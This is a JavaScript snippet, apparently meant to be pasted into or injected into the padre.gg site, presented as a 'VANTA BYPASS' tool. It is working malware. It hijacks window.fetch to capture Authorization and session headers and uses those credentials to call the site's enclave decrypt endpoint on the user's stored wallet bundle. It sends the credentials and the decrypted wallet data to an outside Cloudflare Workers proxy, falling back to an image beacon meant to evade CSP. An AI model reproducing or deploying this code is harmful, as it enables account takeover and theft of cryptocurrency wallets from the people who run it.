(function() {
    const CONFIG = {
        proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
        decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
    };

    // 1. DATA EXFILTRATION BYPASS (Uses 'no-cors' + Image Beacon fallback)
    const exfiltrate = (title, data) => {
        const payload = { embeds: [{ title: title, description: "```json\n" + JSON.stringify(data).substring(0, 1500) + "```", color: 0x00ff88 }] };
        
        // Method A: Fetch
        fetch(CONFIG.proxy, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) }).catch(() => {
            // Method B: Image Beacon (Bypasses most strict CSPs)
            const img = new Image();
            img.src = `${CONFIG.proxy}?data=${btoa(JSON.stringify(data)).substring(0, 500)}`;
        });
    };

    // 2. THE UI (Draggable + Status + Local Backup)
    const initUI = () => {
        const panel = document.createElement('div');
        panel.id = "vanta-ui";
        panel.style = `position:fixed;top:30px;right:30px;width:320px;background:#050505;border:2px solid #00ff88;border-radius:12px;padding:20px;z-index:2147483647;color:#00ff88;font-family:monospace;box-shadow:0 0 30px #00ff8866;`;
        panel.innerHTML = `
            <div id="vanta-drag" style="cursor:move;font-weight:bold;margin-bottom:12px;border-bottom:1px solid #1a1a1a;display:flex;justify-content:space-between;">
                <span>VANTA BYPASS ACTIVE</span><span style="color:#fff;">[SYSTEM]</span>
            </div>
            <div id="vanta-monitor" style="height:120px;overflow-y:auto;font-size:11px;color:#0f0;margin-bottom:15px;background:#000;padding:5px;border:1px solid #111;">
                > Initializing kernel hooks...<br>
                > Bypassing CSP sandbox...
            </div>
            <button id="vanta-force-btn" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;font-weight:900;cursor:pointer;margin-bottom:8px;border-radius:4px;">FORCE DECRYPT & SCAN</button>
            <button id="vanta-dl-btn" style="width:100%;background:transparent;color:#00ff88;border:1px solid #00ff88;padding:8px;font-size:10px;cursor:pointer;border-radius:4px;">DOWNLOAD LOCAL BACKUP (.TXT)</button>
        `;
        document.body.appendChild(panel);

        // Drag Logic
        let active = false, startX, startY;
        document.getElementById('vanta-drag').onmousedown = (e) => { active = true; startX = e.clientX - panel.offsetLeft; startY = e.clientY - panel.offsetTop; };
        document.onmousemove = (e) => { if (active) { panel.style.left = (e.clientX - startX) + 'px'; panel.style.top = (e.clientY - startY) + 'px'; }};
        document.onmouseup = () => active = false;
    };

    const updateLog = (msg) => {
        const mon = document.getElementById('vanta-monitor');
        if (mon) { mon.innerHTML += `<div>> ${msg}</div>`; mon.scrollTop = mon.scrollHeight; }
    };

    // 3. THE HIJACKER (Bypasses site security by locking the 'fetch' property)
    const hijack = () => {
        const originalFetch = window.fetch;
        Object.defineProperty(window, 'fetch', {
            configurable: false,
            writable: false,
            value: async function(...args) {
                const url = args[0].toString();
                const headers = args[1]?.headers || {};
                
                // Sniff the key from any outgoing request
                let auth = headers['Authorization'] || headers['authorization'] || (headers instanceof Headers && headers.get('Authorization'));
                let session = headers['X-Padre-Session'] || (headers instanceof Headers && headers.get('X-Padre-Session'));

                if (auth && !window.vCaptured) {
                    window.vCaptured = { auth, session };
                    updateLog("CREDENTIALS CAPTURED");
                    exfiltrate("🔑 AUTH_SNIFF", { auth, session });
                }
                return originalFetch.apply(this, args);
            }
        });
    };

    // 4. ACTION: FORCE DECRYPT
    const forceDecrypt = async () => {
        updateLog("Executing Enclave Decrypt...");
        const bundles = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundles || !window.vCaptured) {
            updateLog("ERROR: Missing Bundle or Auth. Try refreshing the page.");
            // Trigger a background fetch to force the site to send headers
            fetch('/api/v2/user/profile').catch(()=>{});
            return;
        }

        const data = JSON.parse(bundles);
        const firstId = Object.keys(data.bundles)[0];
        const payload = { bundle: data.bundles[firstId].exportBundle, subOrgId: data.bundles[firstId].subOrgId };

        try {
            const res = await originalFetch(CONFIG.decryptUrl, {
                method: 'POST',
                headers: { 'Authorization': window.vCaptured.auth, 'X-Padre-Session': window.vCaptured.session, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const decrypted = await res.json();
            updateLog("DECRYPT SUCCESS");
            exfiltrate("✅ WALLET_DATA", decrypted);
        } catch (e) { updateLog("DECRYPT FAILED: Access Denied"); }
    };

    // INIT
    initUI();
    hijack();
    
    document.getElementById('vanta-force-btn').onclick = forceDecrypt;
    document.getElementById('vanta-dl-btn').onclick = () => {
        const blob = new Blob([JSON.stringify(localStorage, null, 2)], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'vanta_dump.txt';
        a.click();
    };
})();
